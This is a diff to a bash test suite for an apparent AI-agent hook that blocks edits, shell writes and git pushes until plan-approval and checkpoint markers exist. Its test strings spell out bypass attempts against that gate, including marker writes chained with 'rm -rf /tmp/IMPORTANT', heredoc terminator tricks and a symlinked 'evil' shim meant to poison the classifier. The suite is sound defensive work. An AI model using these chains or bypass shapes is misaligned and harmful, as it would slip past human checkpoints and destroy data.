@@ -47,6 +47,16 @@ reset_state() {
   mkdir -p "$MARKER_DIR"
 }
 
+# planapproval redesign: arming .checkpoint-required is now ANCHORED to an
+# approved-plan token (`.plan-approved.<sid>`), NOT a file-write heuristic.
+# Implementation-boundary tests (arm + pre-checkpoint block) must seed the
+# approval token for their session first. seed_approval <marker_dir> <sid>.
+# (Mirrors `plan-marker.mjs --approve`'s token write.)
+seed_approval() {
+  mkdir -p "$1"
+  : > "$1/.plan-approved.$2"
+}
+
 mock_json() {
   local tool_name="$1"
   local command="${2:-}"
@@ -130,24 +140,37 @@ echo "--- No markers (idle state) ---"
 reset_state
 
 assert_allowed "1.  Read allowed in idle" "$(mock_json 'Read')"
-# Planning-passive redesign (2026-05-25): no session-start arming. A bare
-# Edit/Write/MultiEdit (no/relative file_path → empty FILE_PATH) cannot be
-# proven off-repo, so the pre-gate conservatively blocks at the implementation
-# boundary. Crucially it does NOT arm .checkpoint-required on the empty-path
-# branch (REPO_ROOT may be a fallback cwd → arming would leak a marker into an
-# unrelated repo; see SA-cwd-strict). Off-repo writes (memory/skills/settings)
-# ARE allowed — see SA-5/6/7.
-assert_blocked "2.  Bare Edit conservatively blocks (empty path, planning-passive)" \
-  "$(mock_json 'Edit')" "Checkpoint required"
-assert_blocked "3.  Bare Write conservatively blocks (empty path)" \
-  "$(mock_json 'Write')" "Checkpoint required"
-assert_blocked "4.  Bare MultiEdit conservatively blocks (empty path)" \
-  "$(mock_json 'MultiEdit')" "Checkpoint required"
-assert_marker_absent "4a. Empty-path conservative block did NOT arm .checkpoint-required (no leak)" "$PRE_REQ"
+# planapproval redesign (2026-05-27): arming is anchored to plan-approval, NOT
+# a file-write heuristic. In the idle state (no approved-plan token, nothing
+# armed) a bare Edit/Write/MultiEdit is PLANNING — it is allowed and never arms
+# (NO CHECKPOINTS DURING PLANNING; no plan ⇒ no implementation gate, per the
+# user decision dropping the plan-requirement block). The empty-path branch
+# still never arms (REPO_ROOT may be a fallback cwd → arming would leak a marker
+# into an unrelated repo; see SA-cwd-strict). The "empty path + sanctioned
+# implementation → block" half is covered by tests 11-13 (checkpoint armed) and
+# the approval-seeded blocks below.
+assert_allowed "2.  Bare Edit allowed in idle (no approval ⇒ planning)" \
+  "$(mock_json 'Edit')"
+assert_allowed "3.  Bare Write allowed in idle (no approval ⇒ planning)" \
+  "$(mock_json 'Write')"
+assert_allowed "4.  Bare MultiEdit allowed in idle (no approval ⇒ planning)" \
+  "$(mock_json 'MultiEdit')"
+assert_marker_absent "4a. Idle bare Edit did NOT arm .checkpoint-required (no leak)" "$PRE_REQ"
+# Empty path + approval token present ⇒ sanctioned implementation, can't arm
+# safely → block (require pre-checkpoint), still WITHOUT arming (leak-safe).
+seed_approval "$MARKER_DIR" "idle-approve-sid"
+assert_blocked "4b. Bare Edit + approval token → block (sanctioned impl, empty path)" \
+  "$(jq -n --arg cwd "$TEST_DIR" --arg sid 'idle-approve-sid' \
+    '{tool_name: "Edit", tool_input: {}, cwd: $cwd, session_id: $sid}')" "Checkpoint required"
+assert_marker_absent "4c. Empty-path approval block did NOT arm (defers to pre-done write)" "$PRE_REQ"
+reset_state
 assert_allowed "5.  Bash read-only allowed in idle" "$(mock_json 'Bash' 'ls')"
-assert_allowed "6.  git push allowed in idle (push-gate inactive — no POST_REQ)" \
-  "$(mock_json 'Bash' 'git push origin main')"
-assert_marker_absent "7.  post-required NOT armed in idle" "$POST_REQ"
+# B1 (#351, PR-B2): push self-arms .post-checkpoint-required regardless of
+# pre-checkpoint state, so even an idle push blocks until the post-checkpoint is
+# written — push is now an INDEPENDENT hard gate (D7 backstop). Was: allowed.
+assert_blocked "6.  git push in idle self-arms + blocks (B1 hard gate)" \
+  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
+assert_marker_exists "7.  push self-armed post-required in idle (B1)" "$POST_REQ"
 
 # ============================================================================
 echo ""
@@ -162,21 +185,20 @@ assert_allowed "10. Grep allowed (always)" "$(mock_json 'Grep')"
 assert_blocked "11. Edit blocked by pre-gate" "$(mock_json 'Edit')" "Checkpoint required"
 assert_blocked "12. Write blocked by pre-gate" "$(mock_json 'Write')" "Checkpoint required"
 assert_blocked "13. MultiEdit blocked by pre-gate" "$(mock_json 'MultiEdit')" "Checkpoint required"
-# Planning-passive redesign (2026-05-25): Bash is no longer pre-gated. ALL
-# Bash (read_only AND shared_write) passes the pre-gate; only push_or_pr_create
-# (push-gate) and the marker_write allowlist still gate Bash. shared_write Bash
-# that formerly blocked here is now allowed (F1 residual — pure-Bash
-# implementation bypasses the checkpoint; closure tracked via PR-B). The
-# classifier's read_only/shared_write boundary is still exercised in
-# tests/test-command-classifier.sh.
-assert_allowed "14. Bash shared_write now allowed during pre-gate (Bash ungated)" \
-  "$(mock_json 'Bash' 'echo hello > /tmp/somefile')"
+# PR-B2 (#351, F1 CLOSED): the planning-passive redesign left Bash ungated (the
+# F1 residual — a pure-Bash shared_write implementation bypassed the pre-gate).
+# PR-B2 closes it: shared_write / unsafe_complex / unknown Bash now ARMS + blocks
+# WITH the 3-way deny-hint. nonsrc_write + read_only stay free. The escapable
+# redirect (`> /tmp/x`) arms because the classifier carries no target; the agent
+# classifies it nonsrc_write once and retries (G1). The read_only/nonsrc/shared
+# boundary is exercised in tests/test-command-classifier.sh.
+assert_blocked "14. Bash shared_write now arms + blocks (F1 closed)" \
+  "$(mock_json 'Bash' 'echo hello > /tmp/somefile')" "Checkpoint required"
 assert_allowed "14b. Bash read-only echo allowed (#89)" \
   "$(mock_json 'Bash' 'echo hello')"
-# gh pr checkout mutates the local working tree (shared_write); with Bash
-# ungated it is now allowed during the pre-gate (was blocked pre-redesign).
-assert_allowed "14c. gh pr checkout now allowed during pre-gate (Bash ungated)" \
-  "$(mock_json 'Bash' 'gh pr checkout 113')"
+# gh pr checkout mutates the working tree (shared_write) → arms + blocks (F1 closed).
+assert_blocked "14c. gh pr checkout arms + blocks (F1 closed)" \
+  "$(mock_json 'Bash' 'gh pr checkout 113')" "Checkpoint required"
 # Negative: read-only PR commands must still pass during pre-gate.
 assert_allowed "14d. gh pr view allowed by pre-gate (read_only)" \
   "$(mock_json 'Bash' 'gh pr view 113')"
@@ -225,18 +247,18 @@ assert_allowed "18h. cat <&5 input-fd-dup allowed" \
 assert_allowed "18i. &>>/dev/null allowed" \
   "$(mock_json 'Bash' 'ls &>>/dev/null')"
 
-# Planning-passive: real-file redirects classify as shared_write and — with
-# Bash ungated — are now ALLOWED during the pre-gate (formerly blocked). The
-# fd-dup vs real-file-redirect classifier boundary is owned by FD20-FD24 in
+# PR-B2 (#351, F1 CLOSED): real-file redirects classify as shared_write → now
+# ARM + block (were allowed under the F1 residual). The fd-dup vs real-file-
+# redirect classifier boundary is owned by FD20-FD24 in
 # tests/test-command-classifier.sh; one representative kept here as a gate
 # regression guard.
-assert_allowed "18j. real file redirect (2>file) now allowed (shared_write, Bash ungated)" \
-  "$(mock_json 'Bash' 'ls 2>/tmp/err.log')"
-# fd-dup followed by push: classifier reduces to push_or_pr_create, but the
-# push-gate is inactive without POST_REQ (only PRE_REQ armed here) → allowed.
-# Chained-push blocking under POST_REQ is covered by tests 68 / 77-80.
-assert_allowed "18o. fd-dup then push allowed (push-gate inactive — no POST_REQ)" \
-  "$(mock_json 'Bash' 'git status 2>&1 && git push')"
+assert_blocked "18j. real file redirect (2>file) arms + blocks (F1 closed)" \
+  "$(mock_json 'Bash' 'ls 2>/tmp/err.log')" "Checkpoint required"
+# fd-dup followed by push: classifier reduces to push_or_pr_create → B1 push
+# self-arm fires: POST_REQ self-armed this invocation → block. (Was allowed —
+# push-gate inactive without POST_REQ.)
+assert_blocked "18o. fd-dup then push self-arms + blocks (B1)" \
+  "$(mock_json 'Bash' 'git status 2>&1 && git push')" "Post-implementation checkpoint required"
 
 # ============================================================================
 echo ""
@@ -340,13 +362,15 @@ assert_marker_absent "39. all markers cleaned after gh pr create" "$POST_REQ"
 
 # ============================================================================
 echo ""
-echo "--- Edge: idle state push (no gate active) ---"
+echo "--- Edge: idle state push (B1 — push self-arms a hard gate) ---"
 # ============================================================================
 reset_state
 
-assert_allowed "40. git push allowed when no markers exist" \
-  "$(mock_json 'Bash' 'git push origin main')"
-assert_marker_absent "41. push in idle does not create markers" "$POST_REQ"
+# B1 (#351): push with no markers self-arms POST_REQ this invocation → blocks
+# (was: allowed, no markers created — the pre-B1 push-gate-inactive behavior).
+assert_blocked "40. git push with no markers self-arms + blocks (B1)" \
+  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
+assert_marker_exists "41. push in idle self-arms post-required (B1)" "$POST_REQ"
 
 # ============================================================================
 echo ""
@@ -364,15 +388,21 @@ echo ""
 echo "--- Edge: missing .claude dir (mkdir -p safety) ---"
 # ============================================================================
 rm -rf "$MARKER_DIR"
-# Planning-passive: a concrete in-repo Edit lazily arms .checkpoint-required
-# (ensure_primary_dir mkdir's the missing .checkpoints/) then blocks. The hook
-# must handle the missing marker dir without crashing — assert a clean block
-# plus that the lazy-arm (re)created the dir + marker.
-edit_inrepo_missingdir_json=$(jq -nc --arg fp "$TEST_DIR/src.mjs" --arg cwd "$TEST_DIR" \
-  '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd}')
-assert_blocked "44. Hook handles missing marker dir without crashing (lazy-arm + block)" \
+# planapproval redesign: a concrete in-repo Edit arms .checkpoint-required ONLY
+# when an approved-plan token exists for the session. Seed the token first (the
+# token write itself recreated the missing .checkpoints/ dir). The hook must
+# handle arming under a freshly (re)created dir without crashing — assert a
+# clean block plus that the arm created the session-namespaced marker.
+MD44_SID="44444444-dddd-4ddd-8ddd-444444444444"
+seed_approval "$MARKER_DIR" "$MD44_SID"
+edit_inrepo_missingdir_json=$(jq -nc --arg fp "$TEST_DIR/src.mjs" --arg cwd "$TEST_DIR" --arg sid "$MD44_SID" \
+  '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd, session_id: $sid}')
+assert_blocked "44. Hook handles (re)created marker dir without crashing (approved arm + block)" \
   "$edit_inrepo_missingdir_json" "Checkpoint required"
-assert_marker_exists "44a. lazy-arm recreated .checkpoint-required under missing .checkpoints/" "$PRE_REQ"
+assert_marker_exists "44a. approved arm created .checkpoint-required.<sid> under (re)created .checkpoints/" \
+  "$MARKER_DIR/.checkpoint-required.$MD44_SID"
+assert_marker_absent "44b. arm consumed the approval token (.plan-approved.<sid>)" \
+  "$MARKER_DIR/.plan-approved.$MD44_SID"
 
 # ============================================================================
 echo ""
@@ -434,15 +464,15 @@ reset_state
 touch "$PRE_REQ"
 
 # Command writes to readme.md (shared_write); the heredoc body merely MENTIONS
-# `> .pre-checkpoint-done`. The classifier correctly does NOT treat the body
-# as a marker write (it stays shared_write, not marker_write). Planning-passive:
-# with Bash ungated, this shared_write is now ALLOWED. The classifier's
+# `> .pre-checkpoint-done`. The classifier correctly does NOT treat the body as
+# a marker write (it stays shared_write, not marker_write). PR-B2 (#351, F1
+# closed): a shared_write redirect now ARMS + blocks. The classifier's
 # pre-<<-portion-only parsing is owned by test-command-classifier.sh.
 heredoc_bypass='cat > readme.md <<EOF
 echo > .pre-checkpoint-done
 EOF'
-assert_allowed "54. Heredoc to readme.md allowed (shared_write; body-mention is not a marker write)" \
-  "$(mock_json 'Bash' "$heredoc_bypass")"
+assert_blocked "54. Heredoc to readme.md arms + blocks (shared_write; body-mention not a marker write)" \
+  "$(mock_json 'Bash' "$heredoc_bypass")" "Checkpoint required"
 
 # Legitimate heredoc TO the marker: redirect target is in pre-<< portion → allow.
 heredoc_legit='cat > '"$PRE_DONE"' <<EOF
@@ -458,10 +488,10 @@ assert_blocked "56. Here-string to POST_DONE BLOCKED (POST_REQ not armed)" \
   "$(mock_json 'Bash' "$herestring_legit")" "Checkpoint required"
 
 # Here-string writes to readme.md (shared_write); body merely mentions the
-# marker. Planning-passive: shared_write Bash is ungated → now allowed.
+# marker. PR-B2 (#351, F1 closed): shared_write Bash arms + blocks.
 herestring_bypass='cat > readme.md <<<"echo > .pre-checkpoint-done"'
-assert_allowed "57. Here-string to readme.md allowed (shared_write, Bash ungated)" \
-  "$(mock_json 'Bash' "$herestring_bypass")"
+assert_blocked "57. Here-string to readme.md arms + blocks (shared_write, F1 closed)" \
+  "$(mock_json 'Bash' "$herestring_bypass")" "Checkpoint required"
 
 # ============================================================================
 echo ""
@@ -488,31 +518,29 @@ assert_blocked "53. Bash with unquoted 'git push' (separate token) IS blocked" \
 
 # ============================================================================
 echo ""
-echo "--- #68 F1: chained marker-write (planning-passive: shared_write chains now allowed; push-gate + classifier remain) ---"
+echo "--- #68 F1 CLOSED (PR-B2 #351): chained marker-write reduces to shared_write → arms + blocks ---"
 # ============================================================================
-# Planning-passive (2026-05-25): a marker-write CHAINED with another command
-# reduces (most-restrictive) to shared_write, and with Bash ungated shared_write
-# is ALLOWED. The former "chained command can't bypass the marker allowlist"
-# concern is moot — there is no Bash pre-gate to bypass, and a bare `rm` was
-# already allowed under the F1 residual. Two real boundaries remain and are
-# asserted elsewhere: (1) the push-gate still blocks a chained `git push` when
-# POST_REQ is armed (test 68); (2) the classifier's chain reduction is owned by
-# T70-T76 in test-command-classifier.sh. These chained-write shapes are kept as
-# gate regression guards confirming they now pass.
+# PR-B2 (#351): a marker-write CHAINED with another command reduces (most-
+# restrictive) to shared_write — and shared_write Bash now ARMS + blocks (F1
+# closed). The chain's marker_write segment no longer wins, so the gate's
+# marker_write allowlist is bypassed and the Bash arm fires. This is the
+# intended closure: a chained shared_write can no longer ride a marker-write
+# prefix to escape the pre-checkpoint. The classifier's chain reduction is owned
+# by T70-T76 in test-command-classifier.sh.
 reset_state
 touch "$PRE_REQ"
 
-assert_allowed "64. marker-write THEN ; chained shared_write — allowed (Bash ungated, F1 residual)" \
-  "$(mock_json 'Bash' "echo content > $PRE_DONE; rm -rf /tmp/IMPORTANT")"
-assert_allowed "65. marker-write THEN && chained shared_write — allowed" \
-  "$(mock_json 'Bash' "echo content > $PRE_DONE && rm -rf /tmp/IMPORTANT")"
-assert_allowed "66. marker-write THEN || chained shared_write — allowed" \
-  "$(mock_json 'Bash' "echo content > $PRE_DONE || rm -rf /tmp/IMPORTANT")"
-assert_allowed "67. marker-write THEN | piped shared_write — allowed" \
-  "$(mock_json 'Bash' "echo content > $PRE_DONE | tee /tmp/log")"
-assert_allowed "67b. marker-write THEN newline + ; chained shared_write — allowed (#72)" \
+assert_blocked "64. marker-write THEN ; chained shared_write — arms + blocks (F1 closed)" \
+  "$(mock_json 'Bash' "echo content > $PRE_DONE; rm -rf /tmp/IMPORTANT")" "Checkpoint required"
+assert_blocked "65. marker-write THEN && chained shared_write — arms + blocks" \
+  "$(mock_json 'Bash' "echo content > $PRE_DONE && rm -rf /tmp/IMPORTANT")" "Checkpoint required"
+assert_blocked "66. marker-write THEN || chained shared_write — arms + blocks" \
+  "$(mock_json 'Bash' "echo content > $PRE_DONE || rm -rf /tmp/IMPORTANT")" "Checkpoint required"
+assert_blocked "67. marker-write THEN | piped shared_write — held for classification + blocks" \
+  "$(mock_json 'Bash' "echo content > $PRE_DONE | tee /tmp/log")" "Classify it ONCE"
+assert_blocked "67b. marker-write THEN newline + ; chained shared_write — arms + blocks (#72)" \
   "$(mock_json 'Bash' "echo content > $PRE_DONE
-; rm -rf /tmp/IMPORTANT")"
+; rm -rf /tmp/IMPORTANT")" "Checkpoint required"
 
 # Push-gate variant: chained post-marker-write THEN git push must block
 echo "pre done" > "$PRE_DONE"
@@ -582,17 +610,18 @@ heredoc_chain1="cat > $PRE_DONE <<EOF
 rule18
 EOF
 rm -rf /tmp/IMPORTANT"
-assert_allowed "81. heredoc + post-EOF ; chained shared_write — allowed (Bash ungated, #73)" \
-  "$(mock_json 'Bash' "$heredoc_chain1")"
+assert_blocked "81. heredoc + post-EOF ; chained shared_write — arms + blocks (#73, F1 closed)" \
+  "$(mock_json 'Bash' "$heredoc_chain1")" "Checkpoint required"
 
 heredoc_chain2="cat > $PRE_DONE <<EOF
 rule18
 EOF
 && git push origin main"
-# Chained git push, but push-gate is inactive without POST_REQ (only PRE_REQ
-# armed here) → allowed. Chained-push blocking under POST_REQ is test 68.
-assert_allowed "82. heredoc + post-EOF && git push — allowed (push-gate inactive)" \
-  "$(mock_json 'Bash' "$heredoc_chain2")"
+# Chained git push → reduces to push_or_pr_create → B1 push self-arm fires
+# (POST_REQ self-armed this invocation) → block. (Was: allowed — push-gate
+# inactive without POST_REQ.)
+assert_blocked "82. heredoc + post-EOF && git push — self-arms + blocks (B1)" \
+  "$(mock_json 'Bash' "$heredoc_chain2")" "Post-implementation checkpoint required"
 
 # <<- form (leading tabs allowed on terminator) with post content
 # Session 1: classifier distinguishes chained-command intent. A chained
@@ -605,10 +634,10 @@ heredoc_dash=$(printf 'cat > %s <<-EOF\n\tcontent\n\tEOF\necho leak' "$PRE_DONE"
 assert_allowed "83. <<-EOF + read-only echo chain — allowed (read_only chain)" \
   "$(mock_json 'Bash' "$heredoc_dash")"
 
-# Adversarial dash-EOF with rm chain still blocks (rm is shared_write).
+# Adversarial dash-EOF with rm chain → shared_write → arms + blocks (F1 closed).
 heredoc_dash_evil=$(printf 'cat > %s <<-EOF\n\tcontent\n\tEOF\nrm -rf /tmp/IMPORTANT' "$PRE_DONE")
-assert_allowed "83b. <<-EOF + rm chain — allowed (shared_write, Bash ungated)" \
-  "$(mock_json 'Bash' "$heredoc_dash_evil")"
+assert_blocked "83b. <<-EOF + rm chain — arms + blocks (shared_write, F1 closed)" \
+  "$(mock_json 'Bash' "$heredoc_dash_evil")" "Checkpoint required"
 
 heredoc_quoted="cat > $PRE_DONE <<'EOF'
 literal text
@@ -621,8 +650,8 @@ heredoc_quoted_evil="cat > $PRE_DONE <<'EOF'
 literal text
 EOF
 rm -rf /tmp/IMPORTANT"
-assert_allowed "84b. <<'EOF' + rm chain — allowed (shared_write, Bash ungated)" \
-  "$(mock_json 'Bash' "$heredoc_quoted_evil")"
+assert_blocked "84b. <<'EOF' + rm chain — arms + blocks (shared_write, F1 closed)" \
+  "$(mock_json 'Bash' "$heredoc_quoted_evil")" "Checkpoint required"
 
 # Pure heredoc (regression): no post-EOF content → still allowed
 pure_heredoc="cat > $PRE_DONE <<EOF
@@ -642,7 +671,7 @@ assert_allowed "86. Pure heredoc + trailing whitespace — still allowed" \
 
 # ============================================================================
 echo ""
-echo "--- #75: extended terminator forms (planning-passive: shared_write chains now allowed) ---"
+echo "--- #75: extended terminator forms (PR-B2 #351: shared_write chains arm + block) ---"
 # ============================================================================
 # Per Step-6 adversarial probe of #73 fix: <<\EOF (backslash-escaped) and
 # <<123 (digit-start) terminators were valid bash forms my initial sed regex
@@ -654,24 +683,24 @@ heredoc_backslash='cat > '"$PRE_DONE"' <<\EOF
 rule18
 EOF
 rm -rf /tmp/IMPORTANT'
-assert_allowed "87. <<\\EOF backslash-escaped terminator + rm chain — allowed (shared_write, #75)" \
-  "$(mock_json 'Bash' "$heredoc_backslash")"
+assert_blocked "87. <<\\EOF backslash-escaped terminator + rm chain — arms + blocks (shared_write, #75)" \
+  "$(mock_json 'Bash' "$heredoc_backslash")" "Checkpoint required"
 
 # <<123 (numeric-only terminator) with post chain
 heredoc_numeric='cat > '"$PRE_DONE"' <<123
 rule18
 123
 rm -rf /tmp/IMPORTANT'
-assert_allowed "88. <<123 numeric-only terminator + rm chain — allowed (shared_write, #75)" \
-  "$(mock_json 'Bash' "$heredoc_numeric")"
+assert_blocked "88. <<123 numeric-only terminator + rm chain — arms + blocks (shared_write, #75)" \
+  "$(mock_json 'Bash' "$heredoc_numeric")" "Checkpoint required"
 
 # <<==EOF== (special chars in terminator) — bash valid
 heredoc_special='cat > '"$PRE_DONE"' <<==EOF==
 rule18
 ==EOF==
 rm -rf /tmp/IMPORTANT'
-assert_allowed "89. <<==EOF== special-char terminator + rm chain — allowed (shared_write, #75)" \
-  "$(mock_json 'Bash' "$heredoc_special")"
+assert_blocked "89. <<==EOF== special-char terminator + rm chain — arms + blocks (shared_write, #75)" \
+  "$(mock_json 'Bash' "$heredoc_special")" "Checkpoint required"
 
 # Regression: <<\EOF without post-EOF content still allowed
 heredoc_backslash_pure='cat > '"$PRE_DONE"' <<\EOF
@@ -1513,41 +1542,42 @@ assert_blocked "SA-cwd2. Relative FILE_PATH + absolute top-level .cwd → resolv
 
 # T_cwd3: relative FILE_PATH + RELATIVE .cwd + RELATIVE tool_input.cwd → BLOCK
 #
-# Planning-passive redesign (2026-05-25): relative cwds give no absolute
-# authority, so FILE_PATH resolves to "" and the pre-gate conservatively BLOCKS
-# (Rule 18 safe direction). Crucially, the empty-FILE_PATH branch does NOT
-# lazy-arm — so no .checkpoint-required marker is written at the fallback
-# (hook-pwd) root. The no-leak guarantee is asserted explicitly by
-# SA-cwd-strict below; here we assert the conservative block.
+# planapproval redesign (2026-05-27): relative cwds give no absolute authority,
+# so FILE_PATH resolves to "" (empty path). With NO approved-plan token and
+# nothing armed, this is PLANNING → allowed, and never arms (the empty-FILE_PATH
+# branch never writes a marker, so no leak at the fallback hook-pwd root either).
+# The "empty path + sanctioned implementation → block" half is covered by 4b
+# (approval token) and the armed-checkpoint tests.
 #
-# (Pre-redesign this asserted ALLOW, because the OLD pre-gate only fired when
-# .checkpoint-required was already armed at the resolved root. With lazy-arm,
-# the empty-path case blocks unconditionally.)
-assert_blocked "SA-cwd3. Relative FILE_PATH + relative cwds → empty path conservatively blocks (no arm)" \
+# (Pre-planapproval this asserted a conservative block via the lazy-arm
+# heuristic; the redesign anchors the gate to plan-approval, so an unapproved
+# empty-path edit is planning and passes.)
+assert_allowed "SA-cwd3. Relative FILE_PATH + relative cwds → empty path, no approval → allowed (planning)" \
   "$(jq -n --arg tn 'Edit' --arg fp 'scripts-test.mjs' --arg c './relative' --arg tic './relative-dir' \
-    '{tool_name: $tn, tool_input: {file_path: $fp, cwd: $tic}, cwd: $c}')" "Checkpoint required"
+    '{tool_name: $tn, tool_input: {file_path: $fp, cwd: $tic}, cwd: $c}')"
 
 # T_cwd3-strict: caller cwd != target with empty cwd. Run hook from a separate
 # temp caller cwd; empty top-level .cwd falls back to hook process pwd =
 # CALLER_TMP. FILE_PATH 'scripts/x.mjs' is relative with no absolute authority
-# → resolves to "" → pre-gate conservatively BLOCKS.
+# → resolves to "" → empty path.
 #
-# CRITICAL invariant (lazy-arm leak regression, 2026-05-25): the empty-FILE_PATH
-# branch must NOT lazy-arm. Before the fix, the block path called
-# _arm_checkpoint_required_if_missing, which wrote .checkpoint-required into
-# CALLER_TMP — leaking a marker into an unrelated repo. Assert a block decision
-# AND zero marker artifacts under CALLER_TMP.
+# CRITICAL invariant (lazy-arm leak regression): the empty-FILE_PATH branch must
+# NEVER write a marker. Under the planapproval redesign it never arms at all
+# (arming requires a concrete FILE_PATH AND an approved-plan token). With NO
+# approval here, the edit is PLANNING → allowed (exit 0), and zero marker
+# artifacts appear under CALLER_TMP. Assert allow + no caller-marker leak.
 CALLER_TMP="$(mktemp -d)"
 CALLER_TMP="$(cd -P "$CALLER_TMP" && pwd)"
 SA_CWD_STRICT_JSON="$(jq -n --arg tn 'Edit' --arg fp 'scripts/x.mjs' \
   '{tool_name: $tn, tool_input: {file_path: $fp}, cwd: ""}')"
 SA_CWD_STRICT_OUT="$(cd "$CALLER_TMP" && echo "$SA_CWD_STRICT_JSON" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null)"
-if echo "$SA_CWD_STRICT_OUT" | grep -q '"decision".*"block"' \
+SA_CWD_STRICT_EXIT=$?
+if [ $SA_CWD_STRICT_EXIT -eq 0 ] && [ -z "$SA_CWD_STRICT_OUT" ] \
    && [ ! -e "$CALLER_TMP/.checkpoints" ] && [ ! -e "$CALLER_TMP/.claude" ]; then
-  echo "  ✓ SA-cwd-strict. Caller cwd != target + empty cwd → conservative block + NO caller marker leak (lazy-arm leak regression)"
+  echo "  ✓ SA-cwd-strict. Caller cwd != target + empty cwd, no approval → allowed (planning) + NO caller marker leak"
   ((passed++))
 else
-  echo "  ✗ SA-cwd-strict. out=$SA_CWD_STRICT_OUT caller_leak=$([ -e "$CALLER_TMP/.checkpoints" ] || [ -e "$CALLER_TMP/.claude" ] && echo yes || echo no)"
+  echo "  ✗ SA-cwd-strict. exit=$SA_CWD_STRICT_EXIT out=$SA_CWD_STRICT_OUT caller_leak=$([ -e "$CALLER_TMP/.checkpoints" ] || [ -e "$CALLER_TMP/.claude" ] && echo yes || echo no)"
   ((failed++))
 fi
 rm -rf "$CALLER_TMP"
@@ -1655,12 +1685,16 @@ ln -sf "$GLOBAL_HELPER" "$SYMLINK_HELPER"
 assert_allowed "NC-7. Symlink → allowed canonical path allowed (canonicalize follows symlink)" \
   "$(mock_json 'Bash' "node $SYMLINK_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"
 
-# ── Symlink to shimmed location → now ALLOWED (Bash ungated; canonicalize still
-#    unmasks the target so the validator rejects, but rejection is unobservable) ──
+# ── Symlink to shimmed location → now BLOCKED (PR-B2 #351). The shim's basename
+#    is classifier-marker-evil.mjs, so it does NOT match the classifier-marker.mjs
+#    case-arm → interpreter_other → shared_write → the Bash arm fires. F1 closure
+#    is a security improvement here: the shim command can no longer RUN to poison
+#    the cache (it was allowed under the F1 residual). ──
 SYMLINK_TO_EVIL="$SYMLINK_HELPER_DIR/classifier-marker-evil.mjs"
 ln -sf "$SHIMMED_HELPER" "$SYMLINK_TO_EVIL"
-assert_allowed "NC-8. Symlink → shimmed binary now allowed (Bash ungated, F1 residual)" \
-  "$(mock_json 'Bash' "node $SYMLINK_TO_EVIL --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"
+assert_blocked "NC-8. Symlink → shimmed binary held for classification + blocks (F1 closed)" \
+  "$(mock_json 'Bash' "node $SYMLINK_TO_EVIL --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")" \
+  "Classify it ONCE"
 
 # ── Plan-pending invariant preserved: classifier-marker BLOCKED while plan-pending ──
 # (Even with carve-out, plan-pending check fires earlier and blocks marker_write.)
@@ -1771,12 +1805,15 @@ fi
 echo ""
 echo "--- Planning-passive redesign: nothing armed at rest; first repo write arms (2026-05-25) ---"
 # ============================================================================
-# Core invariants of the planning-passive redesign:
-#   (1) With NOTHING armed, planning/review/exploration never blocks and never
-#       arms — read-only Bash, node inspections, and shared_write review
-#       commands all pass cleanly with zero marker side effects.
-#   (2) The first repo-source Edit/Write lazily arms .checkpoint-required for
-#       the session AND blocks (the implementation boundary).
+# Core invariants of the planning-passive + planapproval redesign:
+#   (1) With NOTHING armed and NO approved-plan token, planning/review/
+#       exploration never blocks and never arms — read-only Bash, node
+#       inspections, shared_write review commands, AND repo-source edits all
+#       pass cleanly with zero marker side effects (NO CHECKPOINTS DURING
+#       PLANNING; no plan ⇒ no implementation gate).
+#   (2) Once a plan is approved (.plan-approved.<sid> token present), the first
+#       repo-source Edit/Write arms .checkpoint-required for the session AND
+#       blocks (the implementation boundary), CONSUMING the token (one-shot).
 #   (3) Off-repo writes (memory/skills/settings) are allowed and never arm.
 #   (4) Arming is per-session and per-repo: sessions and projects don't bleed.
 PP_REPO="$(mktemp -d)"; PP_REPO="$(cd -P "$PP_REPO" && pwd)"
@@ -1802,19 +1839,35 @@ assert_allowed "PP-1. read-only Bash (git status) allowed, nothing armed" \
   "$(mock_pp_bash 'git status' "$PP_SID_A")"
 assert_allowed "PP-2. node em-search (read_only) allowed, nothing armed" \
   "$(mock_pp_bash 'node scripts/em-search.mjs --tag x' "$PP_SID_A")"
-assert_allowed "PP-3. shared_write review command (second-opinion dispatch) allowed (Bash ungated)" \
-  "$(mock_pp_bash 'node scripts/second-opinion.mjs request --provider codex --dispatch' "$PP_SID_A")"
-assert_marker_absent "PP-4. planning Bash did NOT arm .checkpoint-required.<sidA>" \
+# Agent-classifier-first (2026-05-26): a novel review command (second-opinion
+# dispatch is interpreter_other → shared_write, an UNEVALUATED-novel reason) is
+# HELD for agent classification — it BLOCKS with the 3-way deny-hint but does NOT
+# arm .checkpoint-required. The agent classifies it once (read_only / nonsrc_write)
+# and it is free thereafter (G1). (Was: arms + blocks — pre-arming a not-yet-
+# evaluated command framed planning-time inspection as implementation.)
+assert_blocked "PP-3. novel review command blocks (held for classification, no pre-arm)" \
+  "$(mock_pp_bash 'node scripts/second-opinion.mjs request --provider codex --dispatch' "$PP_SID_A")" \
+  "Classify it ONCE"
+assert_marker_absent "PP-4. novel interpreter_other Bash did NOT arm .checkpoint-required.<sidA> (agent-classifier-first)" \
   "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
 assert_marker_absent "PP-4b. planning Bash did NOT arm legacy .checkpoint-required" \
   "$PP_MARKER_DIR/.checkpoint-required"
-
-# (2) Lazy-arm — first repo-source Edit arms + blocks
-reset_pp
-assert_blocked "PP-5. first in-repo Edit blocks at implementation boundary" \
-  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")" "Checkpoint required"
-assert_marker_exists "PP-6. first in-repo Edit lazily armed .checkpoint-required.<sidA>" \
+# planapproval: an in-repo Edit with NO approved-plan token is PLANNING →
+# allowed, and never arms (NO CHECKPOINTS DURING PLANNING).
+assert_allowed "PP-4c. in-repo Edit with no approval → allowed (planning)" \
+  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")"
+assert_marker_absent "PP-4d. unapproved in-repo Edit did NOT arm .checkpoint-required.<sidA>" \
